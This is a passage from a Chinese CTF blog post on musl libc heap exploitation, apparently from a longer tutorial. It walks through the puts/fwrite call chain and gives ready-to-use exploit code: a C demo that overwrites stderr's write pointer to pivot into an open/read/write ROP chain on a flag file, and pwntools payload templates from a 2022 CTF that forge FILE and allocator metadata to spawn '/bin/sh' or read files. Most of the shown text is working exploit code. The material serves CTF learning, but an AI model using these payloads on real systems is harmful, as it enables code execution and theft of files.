<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>) system - <span class="number">0x438a8</span>;</span><br><span class="line"></span><br><span class="line">    FILE *stderr_used = (FILE *) (libc_base + <span class="number">0x295120</span>);</span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x4a736</span>; <span class="comment">// mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span></span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x1b95d</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x14be2</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x1b2da</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdx_ret = libc_base + <span class="number">0x1aeab</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x237d7</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = libc_base + <span class="number">0x1558</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;stderr_used-&gt;write = magic_gadget;</span><br><span class="line">    stderr_used-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span> *) ret;</span><br><span class="line">    assert(stderr_used-&gt;wbase != stderr_used-&gt;wpos);</span><br><span class="line">    stderr_used-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span> *) rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) &amp;rop[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">0</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">1</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">2</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">4</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">    rop[<span class="number">6</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">7</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">    rop[<span class="number">9</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">11</span>] = pop_rdx_ret;</span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0x100</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">15</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">16</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">17</span>] = <span class="number">1</span>;</span><br><span class="line">    rop[<span class="number">18</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">    rop[<span class="number">20</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">21</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">22</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 musl-1.2.1 及以下的版本，可以使用如下 gadget 。或者直接将 <code>chunk</code> 申请到栈上写 rop 。例如这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/WMCTF-Nescafe" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, [rdi+0x30]; mov rsp, rdx; mov rdx, [rdi+0x38]; jmp rdx;</span><br></pre></td></tr></table></figure></div>

<h3 id="puts-调用链"><a href="#puts-调用链" class="headerlink" title="puts 调用链"></a>puts 调用链</h3><p> 分析 <code>puts</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>常用模板如下（<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >2022*CTF BabyNote<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）：<br>get shell</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>orw（musl-1.2.2）</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> musl pwn</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 19:49:33</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-20 03:33:40
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/musl-pwn/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-kernel-pwn-basic-knowlege/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux kernel pwn 基础知识</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/Chrome-v8-pwn/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Chrome V8 Pwn</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">musl pwn</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">调试环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#debug-musl"><span class="nav-text">debug musl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#muslheap"><span class="nav-text">muslheap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">源码阅读环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#musl-heap-musl-1-2-0"><span class="nav-text">musl heap (musl-1.2.0)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">基本数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mal"><span class="nav-text">mal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-text">bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk"><span class="nav-text">chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8F%E5%AE%9A%E4%B9%89"><span class="nav-text">宏定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unbin"><span class="nav-text">unbin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alloc-fwd-alloc-rev"><span class="nav-text">alloc_fwd &amp; alloc_rev</span></a></li></ol></li></ol></li><li 